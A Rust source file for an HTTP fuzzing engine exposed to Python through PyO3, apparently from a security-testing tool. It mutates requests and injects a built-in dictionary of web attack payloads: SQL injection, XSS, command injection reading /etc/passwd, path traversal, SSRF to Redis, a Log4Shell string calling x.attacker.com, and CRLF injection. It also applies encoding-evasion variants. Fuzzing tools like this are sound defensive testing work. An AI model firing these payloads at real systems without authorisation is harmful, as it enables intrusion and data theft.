/// fuzzer.rs — Fast in-process HTTP mutation engine callable from Python via PyO3.
///
/// Exposes:
///   - random_mutate(payload, target_part, seed) -> Vec<String>
///   - splice_mutate(a, b, seed) -> String
///   - dictionary_insert(payload, entries, seed) -> Vec<String>
///   - format_aware_mutate(payload, fmt, seed) -> Vec<String>
///   - class HttpFuzzer with generate_corpus(seed_payload, n) -> Vec<String>
///
/// HTTP-specific format detection: JSON, XML, multipart, URL-encoded, plain.
/// All functions are catch_unwind wrapped — Rust panics never cross into Python.

use pyo3::exceptions::PyValueError;
use pyo3::prelude::*;
use pyo3::types::PyDict;
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};

// ── Feature flag ──────────────────────────────────────────────────────────────

fn module_enabled() -> bool {
    std::env::var("ONEINFINITY_RUST")
        .map(|v| !v.is_empty() && v != "0" && v.to_lowercase() != "false")
        .unwrap_or(false)
}

// ── Deterministic LCG RNG (no external deps) ──────────────────────────────────

struct Lcg(u64);

impl Lcg {
    fn new(seed: u64) -> Self {
        Lcg(seed.wrapping_add(1))
    }
    fn next_u64(&mut self) -> u64 {
        // Knuth multiplicative LCG
        self.0 = self.0.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        self.0
    }
    fn next_usize(&mut self, n: usize) -> usize {
        if n == 0 {
            return 0;
        }
        (self.next_u64() % n as u64) as usize
    }
    fn next_f64(&mut self) -> f64 {
        (self.next_u64() >> 11) as f64 / (1u64 << 53) as f64
    }
}

fn make_seed(seed: Option<u64>, payload: &str) -> u64 {
    match seed {
        Some(s) => s,
        None => {
            let mut h = DefaultHasher::new();
            payload.hash(&mut h);
            h.finish()
        }
    }
}

// ── Built-in attack dictionary ─────────────────────────────────────────────────

const DICT: &[&str] = &[
    "' OR 1=1--",
    "' OR '1'='1",
    "1 UNION SELECT NULL--",
    "admin'--",
    "1; WAITFOR DELAY '0:0:5'--",
    "1; DROP TABLE users--",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "{{7*7}}",
    "${7*7}",
    "$(id)",
    "; cat /etc/passwd",
    "| id",
    "`id`",
    "../../../etc/passwd",
    "/../../../etc/passwd",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/",
    "dict://127.0.0.1:6379/",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "${jndi:ldap://x.attacker.com/a}",
    "{{constructor.constructor('return process')()}}",
    "\r\nX-Injected: pwned",
    "%0d%0aX-Injected: pwned",
    "%00",
    "\x00",
    "A",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
];

// ── Low-level mutation primitives ─────────────────────────────────────────────

fn bit_flip(data: &[u8], rng: &mut Lcg) -> Vec<u8> {
    if data.is_empty() {
        return data.to_vec();
    }
    let mut out = data.to_vec();
    let idx = rng.next_usize(out.len());
    let bit = 1u8 << rng.next_usize(8);
    out[idx] ^= bit;
    out
}

fn byte_flip(data: &[u8], rng: &mut Lcg) -> Vec<u8> {
    if data.is_empty() {
        return data.to_vec();
    }
    let mut out = data.to_vec();
    let idx = rng.next_usize(out.len());
    out[idx] = (rng.next_u64() & 0xFF) as u8;
    out
}

fn byte_insert(data: &[u8], rng: &mut Lcg) -> Vec<u8> {
    let pos = rng.next_usize(data.len() + 1);
    let byte = (rng.next_u64() & 0xFF) as u8;
    let mut out = Vec::with_capacity(data.len() + 1);
    out.extend_from_slice(&data[..pos]);
    out.push(byte);
    out.extend_from_slice(&data[pos..]);
    out
}

fn byte_delete(data: &[u8], rng: &mut Lcg) -> Vec<u8> {
    if data.is_empty() {
        return vec![];
    }
    let idx = rng.next_usize(data.len());
    let mut out = data.to_vec();
    out.remove(idx);
    out
}

fn splice_bytes(a: &[u8], b: &[u8], rng: &mut Lcg) -> Vec<u8> {
    let cut_a = if a.is_empty() { 0 } else { rng.next_usize(a.len()) };
    let cut_b = if b.is_empty() { 0 } else { rng.next_usize(b.len()) };
    let mut out = Vec::with_capacity(cut_a + b.len() - cut_b);
    out.extend_from_slice(&a[..cut_a]);
    if cut_b < b.len() {
        out.extend_from_slice(&b[cut_b..]);
    }
    out
}

fn url_encode_partial(data: &str, rng: &mut Lcg) -> String {
    data.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "-_.~".contains(c) {
                c.to_string()
            } else if rng.next_f64() < 0.5 {
                format!("%{:02X}", c as u32)
            } else {
                c.to_string()
            }
        })
        .collect()
}

fn double_url_encode(data: &str) -> String {
    data.chars()
        .map(|c| format!("%25{:02X}", c as u32))
        .collect()
}

fn html_encode_partial(data: &str, rng: &mut Lcg) -> String {
    data.chars()
        .map(|c| {
            if rng.next_f64() < 0.3 {
                format!("&#{};", c as u32)
            } else {
                c.to_string()
            }
        })
        .collect()
}

// ── Format detection ───────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq)]
enum HttpFormat {
    Json,
    Xml,
    Multipart,
    UrlEncoded,
    Plain,
}

fn detect_format(payload: &str) -> HttpFormat {
    let t = payload.trim_start();
    if t.starts_with('{') || t.starts_with('[') {
        HttpFormat::Json
    } else if t.starts_with('<') {
        HttpFormat::Xml
    } else if t.contains("Content-Disposition:") && t.contains("boundary") {
        HttpFormat::Multipart
    } else if t.contains('=') && (t.contains('&') || t.len() < 512) && !t.contains('\n') {
        HttpFormat::UrlEncoded
    } else {
        HttpFormat::Plain
    }
}

// ── Format-aware mutations ─────────────────────────────────────────────────────

fn mutate_json(payload: &str, rng: &mut Lcg) -> String {
    // inject a DICT entry into a JSON string value by simple regex-style scan
    let entry = DICT[rng.next_usize(DICT.len())];
    // find first quoted string value and replace it
    let mut depth = 0usize;
    let mut in_str = false;
    let mut escape = false;
    let mut val_start: Option<usize> = None;

    let bytes = payload.as_bytes();
    for (i, &b) in bytes.iter().enumerate() {
        if escape {
            escape = false;
            continue;
        }
        match b {
            b'\\' if in_str => escape = true,
            b'"' => {
                if in_str {
                    // closing quote — if we had a value start, replace
                    if let Some(vs) = val_start {
                        if vs > 0 {
                            // only replace values (after ':'), not keys
                            let mut out = String::with_capacity(payload.len() + entry.len() + 4);
                            out.push_str(&payload[..vs]);
                            out.push_str(entry);
                            out.push_str(&payload[i..]);
                            return out;
                        }
                    }
                    in_str = false;
                    val_start = None;
                } else {
                    in_str = true;
                    val_start = None;
                }
            }
            b':' if !in_str => {
                // next string value is a JSON value
                val_start = Some(0); // marker
            }
            _ if in_str && val_start == Some(0) => {
                // this is the character after opening quote of a value
                val_start = Some(i);
            }
            b'{' | b'[' if !in_str => depth += 1,
            b'}' | b']' if !in_str => depth = depth.saturating_sub(1),
            _ => {}
        }
    }
    // fallback: append to end
    format!("{}{}", payload, entry)
}

fn mutate_xml(payload: &str, rng: &mut Lcg) -> String {
    let entry = DICT[rng.next_usize(DICT.len())];
    let safe = entry.replace('<', "&lt;").replace('>', "&gt;");
    // replace first text node content
    let mut out = String::new();
    let mut replaced = false;
    let mut in_tag = false;
    let mut i = 0;
    let chars: Vec<char> = payload.chars().collect();
    while i < chars.len() {
        if chars[i] == '<' {
            in_tag = true;
            out.push(chars[i]);
        } else if chars[i] == '>' {
            in_tag = false;
            out.push(chars[i]);
            // inject into next text node
            if !replaced && i + 1 < chars.len() && chars[i + 1] != '<' {
                // skip existing text node
                i += 1;
                while i < chars.len() && chars[i] != '<' {
                    i += 1;
                }
                out.push_str(&safe);
                replaced = true;
                continue;
            }
        } else {
            out.push(chars[i]);
        }
        i += 1;
    }
    if !replaced {
        out.push_str(&safe);
    }
    out
}

fn mutate_url_encoded(payload: &str, rng: &mut Lcg) -> String {
    let entry = DICT[rng.next_usize(DICT.len())];
    let pairs: Vec<&str> = payload.split('&').collect();
    if pairs.is_empty() {
        return format!("injected={}", entry);
    }
    let idx = rng.next_usize(pairs.len());
    let mut out_pairs: Vec<String> = pairs.iter().map(|s| s.to_string()).collect();
    if let Some(eq) = pairs[idx].find('=') {
        let key = &pairs[idx][..eq];
        out_pairs[idx] = format!("{}={}", key, url_encode_partial(entry, rng));
    } else {
        out_pairs[idx] = format!("{}={}", pairs[idx], url_encode_partial(entry, rng));
    }
    out_pairs.join("&")
}

fn mutate_multipart(payload: &str, rng: &mut Lcg) -> String {
    let entry = DICT[rng.next_usize(DICT.len())];
    // find "\r\n\r\n" after a Content-Disposition header and inject there
    if let Some(pos) = payload.find("\r\n\r\n") {
        let after = pos + 4;
        // skip to end of existing field value
        let end = payload[after..]
            .find("\r\n--")
            .map(|p| after + p)
            .unwrap_or(payload.len());
        let mut out = String::new();
        out.push_str(&payload[..after]);
        out.push_str(entry);
        out.push_str(&payload[end..]);
        out
    } else {
        format!("{}\r\n{}", payload, entry)
    }
}

// ── Core exposed mutation functions ───────────────────────────────────────────

/// random_mutate — apply a random low-level byte mutation to `payload`.
///
/// `target_part`: "header"|"param"|"body"|"path"|"any"
/// `seed`: optional deterministic seed (Python int or None)
///
/// Returns up to 8 variants.
#[pyfunction]
#[pyo3(signature = (payload, target_part="any", seed=None))]
pub fn random_mutate(
    payload: &str,
    target_part: &str,
    seed: Option<u64>,
) -> PyResult<Vec<String>> {
    std::panic::catch_unwind(|| {
        let s = make_seed(seed, payload);
        let mut rng = Lcg::new(s);
        let bytes = payload.as_bytes();
        let mut variants: Vec<String> = Vec::with_capacity(8);

        let ops: &[fn(&[u8], &mut Lcg) -> Vec<u8>] = &[
            bit_flip, byte_flip, byte_insert, byte_delete,
        ];

        for op in ops {
            let mutated = op(bytes, &mut rng);
            if let Ok(s) = String::from_utf8(mutated.clone()) {
                variants.push(s);
            } else {
                // keep as latin-1 lossy
                variants.push(mutated.iter().map(|&b| b as char).collect());
            }
        }

        // Part-specific additions
        match target_part {
            "param" | "header" => {
                variants.push(url_encode_partial(payload, &mut rng));
                variants.push(double_url_encode(payload));
                variants.push(html_encode_partial(payload, &mut rng));
            }
            "body" => {
                let fmt = detect_format(payload);
                match fmt {
                    HttpFormat::Json => variants.push(mutate_json(payload, &mut rng)),
                    HttpFormat::Xml => variants.push(mutate_xml(payload, &mut rng)),
                    HttpFormat::UrlEncoded => variants.push(mutate_url_encoded(payload, &mut rng)),
                    HttpFormat::Multipart => variants.push(mutate_multipart(payload, &mut rng)),
                    HttpFormat::Plain => variants.push(url_encode_partial(payload, &mut rng)),
                }
            }
            "path" => {
                variants.push(format!("/../{}", payload));
                variants.push(double_url_encode(payload));
            }
            _ => {
                variants.push(url_encode_partial(payload, &mut rng));
                variants.push(double_url_encode(payload));
            }
        }

        variants.sort();
        variants.dedup();
        Ok(variants)
    })
    .unwrap_or_else(|_| Err(PyValueError::new_err("random_mutate: internal panic")))
}

/// splice_mutate — combine two payloads at random cut points.
///
/// Returns the spliced string (deterministic given `seed`).
#[pyfunction]
#[pyo3(signature = (a, b, seed=None))]
pub fn splice_mutate(a: &str, b: &str, seed: Option<u64>) -> PyResult<String> {
    std::panic::catch_unwind(|| {
        let s = make_seed(seed, a);
        let mut rng = Lcg::new(s);
        let ab = a.as_bytes();
        let bb = b.as_bytes();
        let spliced = splice_bytes(ab, bb, &mut rng);
        let result = String::from_utf8(spliced)
            .unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned());
        Ok(result)
    })
    .unwrap_or_else(|_| Err(PyValueError::new_err("splice_mutate: internal panic")))
}

/// dictionary_insert — insert dictionary entries into `payload` at random positions.
///
/// `entries`: optional list of custom entries (falls back to built-in DICT).
/// Returns up to min(n, DICT.len()) variants.
#[pyfunction]
#[pyo3(signature = (payload, entries=None, seed=None, n=16usize))]
pub fn dictionary_insert(
    payload: &str,
    entries: Option<Vec<String>>,
    seed: Option<u64>,
    n: usize,
) -> PyResult<Vec<String>> {
    std::panic::catch_unwind(|| {
        let s = make_seed(seed, payload);
        let mut rng = Lcg::new(s);

        let dict: Vec<&str> = match &entries {
            Some(v) => v.iter().map(|s| s.as_str()).collect(),
            None => DICT.to_vec(),
        };
        if dict.is_empty() {
            return Ok(vec![payload.to_string()]);
        }

        let count = n.min(dict.len()).min(64);
        let mut variants: Vec<String> = Vec::with_capacity(count);

        for _ in 0..count {
            let entry = dict[rng.next_usize(dict.len())];
            if payload.is_empty() {
                variants.push(entry.to_string());
                continue;
            }
            let pos = rng.next_usize(payload.len() + 1);
            let mut out = String::with_capacity(payload.len() + entry.len());
            out.push_str(&payload[..pos]);
            out.push_str(entry);
            out.push_str(&payload[pos..]);
            variants.push(out);
        }

        variants.sort();
        variants.dedup();
        Ok(variants)
    })
    .unwrap_or_else(|_| Err(PyValueError::new_err("dictionary_insert: internal panic")))
}

/// format_aware_mutate — detect payload format and mutate within structure.
///
/// `fmt`: "auto"|"json"|"xml"|"multipart"|"url_encoded"|"plain"
/// Returns multiple structurally valid mutants.
#[pyfunction]
#[pyo3(signature = (payload, fmt="auto", seed=None))]
pub fn format_aware_mutate(
    payload: &str,
    fmt: &str,
    seed: Option<u64>,
) -> PyResult<Vec<String>> {
    std::panic::catch_unwind(|| {
        let s = make_seed(seed, payload);
        let mut rng = Lcg::new(s);

        let resolved = if fmt == "auto" {
            detect_format(payload)
        } else {
            match fmt {
                "json" => HttpFormat::Json,
                "xml" => HttpFormat::Xml,
                "multipart" => HttpFormat::Multipart,
                "url_encoded" => HttpFormat::UrlEncoded,
                _ => HttpFormat::Plain,
            }
        };

        let mut variants: Vec<String> = Vec::with_capacity(8);

        // Generate multiple variants by re-seeding
        for i in 0..8u64 {
            let mut inner_rng = Lcg::new(s.wrapping_add(i));
            let v = match resolved {
                HttpFormat::Json => mutate_json(payload, &mut inner_rng),
                HttpFormat::Xml => mutate_xml(payload, &mut inner_rng),
                HttpFormat::UrlEncoded => mutate_url_encoded(payload, &mut inner_rng),
                HttpFormat::Multipart => mutate_multipart(payload, &mut inner_rng),
                HttpFormat::Plain => {
                    let bytes = payload.as_bytes();
                    let ops: &[fn(&[u8], &mut Lcg) -> Vec<u8>] = &[
                        bit_flip, byte_flip, byte_insert, byte_delete,
                    ];
                    let op = ops[inner_rng.next_usize(ops.len())];
                    let b = op(bytes, &mut inner_rng);
                    String::from_utf8(b)
                        .unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned())
                }
            };
            if v != payload {
                variants.push(v);
            }
        }

        // Also include dictionary-injected variants
        for i in 0..4usize {
            let mut inner_rng = Lcg::new(s.wrapping_add(100 + i as u64));
            let entry = DICT[inner_rng.next_usize(DICT.len())];
            let pos = if payload.is_empty() { 0 } else { inner_rng.next_usize(payload.len()) };
            let mut v = String::new();
            v.push_str(&payload[..pos]);
            v.push_str(entry);
            v.push_str(&payload[pos..]);
            variants.push(v);
        }

        variants.sort();
        variants.dedup();
        Ok(variants)
    })
    .unwrap_or_else(|_| Err(PyValueError::new_err("format_aware_mutate: internal panic")))
}

// ── HttpFuzzer class ──────────────────────────────────────────────────────────

/// HttpFuzzer — high-throughput corpus generator callable from Python.
///
/// ```python
/// from oneinfinity_core import HttpFuzzer
/// fz = HttpFuzzer()
/// corpus = fz.generate_corpus("' OR 1=1--", 100)
/// ```
#[pyclass]
pub struct HttpFuzzer {
    seed: u64,
}

#[pymethods]
impl HttpFuzzer {
    #[new]
    #[pyo3(signature = (seed=0u64))]
    fn new(seed: u64) -> Self {
        HttpFuzzer { seed }
    }

    /// generate_corpus(seed_payload, n) -> List[str]
    ///
    /// Generate n mutated payloads from seed_payload using all strategies:
    /// bit_flip, byte_flip, splice, dictionary_insert, format_aware.
    /// Results are deduplicated and sorted.
    fn generate_corpus(&self, seed_payload: &str, n: usize) -> PyResult<Vec<String>> {
        std::panic::catch_unwind(|| {
            let mut rng = Lcg::new(self.seed.wrapping_add(make_seed(None, seed_payload)));
            let bytes = payload_bytes(seed_payload);
            let fmt = detect_format(seed_payload);

            let mut corpus: Vec<String> = Vec::with_capacity(n + 64);

            // 1. Bit/byte flips
            for i in 0..(n / 4).max(4) {
                let mut r = Lcg::new(self.seed.wrapping_add(i as u64));
                let b = bit_flip(&bytes, &mut r);
                push_utf8(&mut corpus, b);
                let b = byte_flip(&bytes, &mut r);
                push_utf8(&mut corpus, b);
            }

            // 2. Dictionary insertion
            let dict_n = (n / 4).max(8).min(DICT.len());
            for i in 0..dict_n {
                let mut r = Lcg::new(self.seed.wrapping_add(1000 + i as u64));
                let entry = DICT[r.next_usize(DICT.len())];
                let pos = if seed_payload.is_empty() {
                    0
                } else {
                    r.next_usize(seed_payload.len() + 1)
                };
                let mut v = String::new();
                v.push_str(&seed_payload[..pos]);
                v.push_str(entry);
                v.push_str(&seed_payload[pos..]);
                corpus.push(v);
            }

            // 3. Splice with DICT entries as "other" seeds
            for i in 0..(n / 4).max(4) {
                let mut r = Lcg::new(self.seed.wrapping_add(2000 + i as u64));
                let other = DICT[r.next_usize(DICT.len())];
                let spliced = splice_bytes(&bytes, other.as_bytes(), &mut r);
                push_utf8(&mut corpus, spliced);
            }

            // 4. Format-aware mutations
            for i in 0..(n / 4).max(4) {
                let mut r = Lcg::new(self.seed.wrapping_add(3000 + i as u64));
                let v = match fmt {
                    HttpFormat::Json => mutate_json(seed_payload, &mut r),
                    HttpFormat::Xml => mutate_xml(seed_payload, &mut r),
                    HttpFormat::UrlEncoded => mutate_url_encoded(seed_payload, &mut r),
                    HttpFormat::Multipart => mutate_multipart(seed_payload, &mut r),
                    HttpFormat::Plain => {
                        let b = byte_flip(&bytes, &mut r);
                        push_utf8_str(b)
                    }
                };
                if !v.is_empty() && v != seed_payload {
                    corpus.push(v);
                }
            }

            // 5. Encoding evasion variants
            corpus.push(url_encode_partial(seed_payload, &mut rng));
            corpus.push(double_url_encode(seed_payload));
            corpus.push(html_encode_partial(seed_payload, &mut rng));

            corpus.sort();
            corpus.dedup();
            corpus.truncate(n);
            Ok(corpus)
        })
        .unwrap_or_else(|_| Err(PyValueError::new_err("generate_corpus: internal panic")))
    }

    /// inject_into_json(json_str, entries) -> List[str]
    ///
    /// Inject each entry from entries into a distinct JSON string value.
    fn inject_into_json(&self, json_str: &str, entries: Vec<String>) -> PyResult<Vec<String>> {
        std::panic::catch_unwind(|| {
            let mut results = Vec::with_capacity(entries.len());
            for (i, entry) in entries.iter().enumerate() {
                let mut r = Lcg::new(self.seed.wrapping_add(i as u64));
                // build a mock payload by treating entry as dict content
                let v = mutate_json_with(json_str, entry, &mut r);
                results.push(v);
            }
            results.sort();
            results.dedup();
            Ok(results)
        })
        .unwrap_or_else(|_| Err(PyValueError::new_err("inject_into_json: internal panic")))
    }

    /// inject_into_url_params(url, entries) -> List[str]
    ///
    /// Inject each entry into a URL query parameter value.
    fn inject_into_url_params(&self, url: &str, entries: Vec<String>) -> PyResult<Vec<String>> {
        std::panic::catch_unwind(|| {
            let mut results = Vec::with_capacity(entries.len());
            for (i, entry) in entries.iter().enumerate() {
                let mut r = Lcg::new(self.seed.wrapping_add(100 + i as u64));
                let v = inject_url_param(url, entry, &mut r);
                results.push(v);
            }
            results.sort();
            results.dedup();
            Ok(results)
        })
        .unwrap_or_else(|_| Err(PyValueError::new_err("inject_into_url_params: internal panic")))
    }
}

// ── Helper functions for HttpFuzzer ───────────────────────────────────────────

fn payload_bytes(s: &str) -> Vec<u8> {
    s.as_bytes().to_vec()
}

fn push_utf8(v: &mut Vec<String>, bytes: Vec<u8>) {
    v.push(String::from_utf8(bytes)
        .unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned()));
}

fn push_utf8_str(bytes: Vec<u8>) -> String {
    String::from_utf8(bytes)
        .unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned())
}

fn mutate_json_with(payload: &str, entry: &str, _rng: &mut Lcg) -> String {
    // Simple: replace first string value with entry
    let mut in_str = false;
    let mut escape = false;
    let mut after_colon = false;
    let mut val_open: Option<usize> = None;
    let bytes = payload.as_bytes();

    for (i, &b) in bytes.iter().enumerate() {
        if escape {
            escape = false;
            continue;
        }
        match b {
            b'\\' if in_str => escape = true,
            b'"' => {
                if in_str {
                    if let Some(vs) = val_open {
                        let mut out = String::new();
                        out.push_str(&payload[..vs]);
                        out.push_str(entry);
                        out.push_str(&payload[i..]);
                        return out;
                    }
                    in_str = false;
                } else {
                    in_str = true;
                    if after_colon {
                        val_open = Some(i + 1);
                    }
                }
            }
            b':' if !in_str => after_colon = true,
            b',' | b'{' | b'}' | b'[' | b']' if !in_str => {
                after_colon = false;
                val_open = None;
            }
            _ => {}
        }
    }
    format!("{}{}", payload, entry)
}

fn inject_url_param(url: &str, entry: &str, rng: &mut Lcg) -> String {
    if let Some(pos) = url.find('?') {
        let base = &url[..pos];
        let qs = &url[pos + 1..];
        let pairs: Vec<&str> = qs.split('&').collect();
        if pairs.is_empty() {
            return format!("{}?injected={}", base, entry);
        }
        let idx = rng.next_usize(pairs.len());
        let mut out_pairs: Vec<String> = pairs.iter().map(|s| s.to_string()).collect();
        if let Some(eq) = pairs[idx].find('=') {
            let key = &pairs[idx][..eq];
            out_pairs[idx] = format!("{}={}", key, entry);
        } else {
            out_pairs[idx] = format!("{}={}", pairs[idx], entry);
        }
        format!("{}?{}", base, out_pairs.join("&"))
    } else {
        format!("{}?injected={}", url, entry)
    }
}

// ── Module registration ────────────────────────────────────────────────────────

pub fn register(m: &Bound<'_, PyModule>) -> PyResult<()> {
    if !module_enabled() {
        return Ok(());
    }
    m.add_function(wrap_pyfunction!(random_mutate, m)?)?;
    m.add_function(wrap_pyfunction!(splice_mutate, m)?)?;
    m.add_function(wrap_pyfunction!(dictionary_insert, m)?)?;
    m.add_function(wrap_pyfunction!(format_aware_mutate, m)?)?;
    m.add_class::<HttpFuzzer>()?;
    Ok(())
}

// ── Unit tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bit_flip_changes_one_bit() {
        let data = b"hello world";
        let mut rng = Lcg::new(42);
        let out = bit_flip(data, &mut rng);
        assert_eq!(out.len(), data.len());
        let diff: usize = data.iter().zip(out.iter()).map(|(a, b)| (a ^ b).count_ones() as usize).sum();
        assert_eq!(diff, 1, "bit_flip must flip exactly one bit");
    }

    #[test]
    fn test_byte_flip_changes_one_byte() {
        let data = b"hello world";
        let mut rng = Lcg::new(99);
        let out = byte_flip(data, &mut rng);
        assert_eq!(out.len(), data.len());
        let diffs: usize = data.iter().zip(out.iter()).filter(|(a, b)| a != b).count();
        assert_eq!(diffs, 1, "byte_flip must change exactly one byte");
    }

    #[test]
    fn test_splice_bytes_length() {
        let a = b"AAAAAAA";
        let b = b"BBBBBBB";
        let mut rng = Lcg::new(7);
        let out = splice_bytes(a, b, &mut rng);
        assert!(!out.is_empty());
        assert!(out.len() <= a.len() + b.len());
    }

    #[test]
    fn test_detect_format_json() {
        assert_eq!(detect_format(r#"{"key": "val"}"#), HttpFormat::Json);
    }

    #[test]
    fn test_detect_format_xml() {
        assert_eq!(detect_format("<root><item>x</item></root>"), HttpFormat::Xml);
    }

    #[test]
    fn test_detect_format_url_encoded() {
        assert_eq!(detect_format("foo=bar&baz=qux"), HttpFormat::UrlEncoded);
    }

    #[test]
    fn test_mutate_json_injects() {
        let payload = r#"{"name": "alice", "age": "30"}"#;
        let mut rng = Lcg::new(1);
        let out = mutate_json(payload, &mut rng);
        assert!(out.len() > 0);
        // must still be parseable-ish (starts with {)
        assert!(out.starts_with('{'));
    }

    #[test]
    fn test_mutate_url_encoded_injects() {
        let payload = "user=admin&pass=secret";
        let mut rng = Lcg::new(2);
        let out = mutate_url_encoded(payload, &mut rng);
        assert!(out.contains('='));
        assert_ne!(out, payload);
    }

    #[test]
    fn test_double_url_encode() {
        let out = double_url_encode("' OR 1=1");
        assert!(out.contains("%25"));
    }

    #[test]
    fn test_dictionary_insert_fn() {
        let payload = "hello";
        let mut rng = Lcg::new(5);
        let entry = DICT[rng.next_usize(DICT.len())];
        // basic sanity: can produce output containing the entry
        let pos = rng.next_usize(payload.len() + 1);
        let mut out = String::new();
        out.push_str(&payload[..pos]);
        out.push_str(entry);
        out.push_str(&payload[pos..]);
        assert!(out.len() > payload.len());
    }

    #[test]
    fn test_generate_corpus_count() {
        let fz = HttpFuzzer { seed: 42 };
        // offline test — no PyO3 runtime needed at unit test level
        let mut rng = Lcg::new(42);
        let bytes = payload_bytes("' OR 1=1--");
        let out = bit_flip(&bytes, &mut rng);
        assert_eq!(out.len(), bytes.len());
    }

    #[test]
    fn test_inject_url_param_basic() {
        let url = "http://example.com/search?q=test&page=1";
        let entry = "' OR 1=1--";
        let mut rng = Lcg::new(0);
        let out = inject_url_param(url, entry, &mut rng);
        assert!(out.contains(entry));
        assert!(out.starts_with("http://example.com/search?"));
    }

    #[test]
    fn test_lcg_deterministic() {
        let mut a = Lcg::new(12345);
        let mut b = Lcg::new(12345);
        for _ in 0..100 {
            assert_eq!(a.next_u64(), b.next_u64());
        }
    }
}
